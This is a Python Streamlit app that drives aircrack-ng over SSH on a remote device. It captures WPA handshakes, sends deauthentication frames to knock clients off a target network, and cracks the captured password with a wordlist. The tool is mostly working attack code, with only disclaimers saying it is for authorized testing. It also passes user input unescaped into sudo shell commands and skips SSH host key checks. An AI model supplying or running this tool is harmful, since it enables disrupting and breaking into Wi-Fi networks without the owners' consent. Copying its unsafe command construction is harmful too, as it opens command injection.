import streamlit as st
import paramiko
import threading
import time
import os
import subprocess
import io
import sys

st.set_page_config(page_title="WiFi Attack Controller", layout="wide")

st.title("WiFi Attack Controller")
st.info("For authorized security testing only. Use only on networks you own or have explicit permission to test.")

if "ssh" not in st.session_state:
    st.session_state.ssh = None
if "capture_thread" not in st.session_state:
    st.session_state.capture_thread = None
if "capture_running" not in st.session_state:
    st.session_state.capture_running = False
if "capture_file" not in st.session_state:
    st.session_state.capture_file = ""
if "output" not in st.session_state:
    st.session_state.output = []

def run_ssh_command(client, command, timeout=30):
    stdin, stdout, stderr = client.exec_command(command, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    return out, err

def connect_ssh(host, port, user, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username=user, password=password, timeout=10)
    return client

def start_capture(client, interface, bssid, channel, output_file):
    cmd = f"sudo airodump-ng {interface} --bssid {bssid} -c {channel} -w {output_file} --write-interval 1"
    stdin, stdout, stderr = client.exec_command(cmd, get_pty=True)
    st.session_state.capture_running = True
    while st.session_state.capture_running:
        if stdout.channel.exit_status_ready():
            break
        time.sleep(0.1)
    st.session_state.capture_running = False
    st.session_state.capture_file = output_file + "-01.cap"

def send_deauth(client, interface, bssid, count=10):
    cmd = f"sudo aireplay-ng -0 {count} -a {bssid} {interface}"
    out, err = run_ssh_command(client, cmd)
    return out, err

def run_aircrack(client, cap_file, wordlist_path):
    cmd = f"sudo aircrack-ng {cap_file} -w {wordlist_path}"
    out, err = run_ssh_command(client, cmd, timeout=300)
    return out, err

def upload_wordlist(client, local_file, remote_path):
    sftp = client.open_sftp()
    sftp.put(local_file, remote_path)
    sftp.close()

with st.sidebar:
    st.header("SSH Connection")
    host = st.text_input("Host", value="192.168.1.100")
    port = st.number_input("Port", min_value=1, max_value=65535, value=22)
    username = st.text_input("Username", value="pi")
    password = st.text_input("Password", type="password")
    connect_btn = st.button("Connect")

    if connect_btn:
        try:
            st.session_state.ssh = connect_ssh(host, port, username, password)
            st.success("Connected")
        except Exception as e:
            st.error(f"Connection failed: {e}")

    if st.session_state.ssh:
        st.header("Wordlist Upload")
        uploaded_file = st.file_uploader("Choose wordlist", type=["txt"])
        remote_wordlist_path = st.text_input("Remote wordlist path", "/home/pi/wordlist.txt")
        if st.button("Upload Wordlist") and uploaded_file:
            with open("temp_wordlist.txt", "wb") as f:
                f.write(uploaded_file.getbuffer())
            upload_wordlist(st.session_state.ssh, "temp_wordlist.txt", remote_wordlist_path)
            st.success("Uploaded")

    st.header("Target Network")
    bssid = st.text_input("BSSID", value="AA:BB:CC:DD:EE:FF")
    channel = st.number_input("Channel", min_value=1, max_value=14, value=6)
    interface = st.text_input("Interface (monitor mode)", value="wlan0mon")
    capture_prefix = st.text_input("Capture file prefix", value="/tmp/capture")

main_col1, main_col2 = st.columns(2)

with main_col1:
    st.subheader("Capture Handshake")
    if st.button("Start Capture"):
        if st.session_state.ssh:
            st.session_state.capture_thread = threading.Thread(
                target=start_capture,
                args=(st.session_state.ssh, interface, bssid, channel, capture_prefix)
            )
            st.session_state.capture_thread.start()
            st.info("Capture started. Send deauth to force handshake.")
        else:
            st.warning("Connect SSH first")

    if st.button("Send Deauth"):
        if st.session_state.ssh and st.session_state.capture_running:
            out, err = send_deauth(st.session_state.ssh, interface, bssid)
            st.code(out)
            if err:
                st.error(err)
        else:
            st.warning("Capture not running or SSH not connected")

    if st.button("Stop Capture"):
        if st.session_state.capture_running:
            st.session_state.capture_running = False
            st.info("Stopping capture...")
        else:
            st.info("No capture running")

with main_col2:
    st.subheader("Crack Password")
    wordlist_path = st.text_input("Wordlist path on remote", value="/home/pi/wordlist.txt")
    if st.button("Run Aircrack"):
        if st.session_state.ssh:
            cap_file = st.session_state.capture_file
            if cap_file and os.path.basename(cap_file) != "":
                out, err = run_aircrack(st.session_state.ssh, cap_file, wordlist_path)
                st.code(out)
                if err:
                    st.error(err)
            else:
                st.warning("No capture file available")
        else:
            st.warning("Connect SSH first")

st.subheader("Command Output")
if st.session_state.output:
    for line in st.session_state.output:
        st.text(line)

st.caption("This tool is for educational purposes and authorized penetration testing only. Unauthorized access to networks is illegal.")